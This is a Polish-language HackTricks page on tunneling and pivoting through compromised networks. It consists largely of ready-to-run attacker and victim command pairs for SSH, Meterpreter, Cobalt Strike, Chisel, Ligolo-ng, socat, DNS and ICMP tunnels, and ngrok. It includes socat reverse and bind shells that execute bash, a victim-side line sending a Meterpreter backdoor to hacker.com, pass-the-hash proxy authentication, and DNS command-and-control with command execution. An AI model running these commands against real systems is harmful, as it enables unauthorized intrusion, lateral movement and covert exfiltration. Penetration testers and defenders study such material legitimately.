# Tunneling and Port Forwarding

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

## Nmap tip

{% hint style="warning" %}
**Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH graficzne połączenie (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Otwórz nowy port na serwerze SSH --> Inny port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalny port --> Skompromitowany host (SSH) --> Trzecia\_skrzynka:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalny port --> Skompromitowany host (SSH) --> Gdziekolwiek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

To jest przydatne do uzyskiwania odwrotnych powłok z wewnętrznych hostów przez DMZ do twojego hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Potrzebujesz **roota na obu urządzeniach** (ponieważ zamierzasz utworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Włącz przekazywanie po stronie serwera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Możesz **tunnel** przez **ssh** cały **traffic** do **subnetwork** przez hosta.\
Na przykład, przekierowując cały traffic kierujący się do 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia\_maszyna:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być użyty do **przekierowania ruchu przez beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
W tym przypadku **port jest otwarty w hoście beacon**, a nie w serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Do zauważenia:

* Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
* Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
* **Uprawnienia administratora nie są wymagane** do tworzenia odwróconych przekierowań portów na wysokich portach.

### rPort2Port lokalny

{% hint style="warning" %}
W tym przypadku **port jest otwierany w hoście beacona**, a nie w Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Musisz przesłać plik tunelowy: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Możesz go pobrać z strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Musisz używać **tej samej wersji dla klienta i serwera**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Przekierowanie portów
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Użyj tej samej wersji dla agenta i proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Powiązanie agenta i nasłuchiwanie
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Odwrócony tunel. Tunel jest uruchamiany z ofiary.\
Tworzony jest proxy socks4 na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot przez **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell powiązany
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Odwrócona powłoka
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter przez SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz obejść **proxy bez uwierzytelnienia**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunel SSL Socat

**/bin/sh konsola**

Utwórz certyfikaty po obu stronach: Klient i Serwer
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).

Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Musisz być lokalnym administratorem (dla dowolnego portu)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC jest odpowiedzialne za **tunneling pakietów przez połączenie RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarny plik `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swojej maszynie (atakującego), że port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxy ruchu przez ten port.**

## Proxify aplikacje GUI Windows

Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
W **Profile -> Proxification Rules** dodaj nazwę programu do proxowania oraz połączenia do IP, które chcesz proxować.

## Ominięcie proxy NTLM

Wcześniej wspomniane narzędzie: **Rpivot**\
**OpenVPN** może również to obejść, ustawiając te opcje w pliku konfiguracyjnym:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać narzędzia według własnego wyboru przez ten port.\
Na przykład, aby przekazać port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Teraz, jeśli ustawisz na przykład w ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.

## YARP

Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą zapytań DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel będzie bardzo wolny. Możesz utworzyć skompresowane połączenie SSH przez ten tunel, używając:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pobierz stąd**](https://github.com/iagox86/dnscat2)**.**

Ustanawia kanał C\&C przez DNS. Nie wymaga uprawnień roota.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShell**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowanie portów z dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmień DNS w proxychains

Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnie serwer DNS, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w środowisku **Windows**, możesz ustawić adres IP **kontrolera domeny**.

## Tunelowanie w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunelowanie ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root jest potrzebny w obu systemach, aby utworzyć adaptery tun i tunelować dane między nimi za pomocą żądań echo ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz stąd**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**\
&#xNAN;_&#x45;xposition URI są jak:_ **UID.ngrok.io**

### Instalacja

* Utwórz konto: https://ngrok.com/signup
* Pobierz klienta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Podstawowe zastosowania

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Możliwe jest również dodanie uwierzytelniania i TLS, jeśli to konieczne._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Udostępnianie plików za pomocą HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Pożyteczne dla XSS, SSRF, SSTI ..._\
Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml prosty przykład konfiguracji

Otwiera 3 tunele:

* 2 TCP
* 1 HTTP z ekspozycją statycznych plików z /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Inne narzędzia do sprawdzenia

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
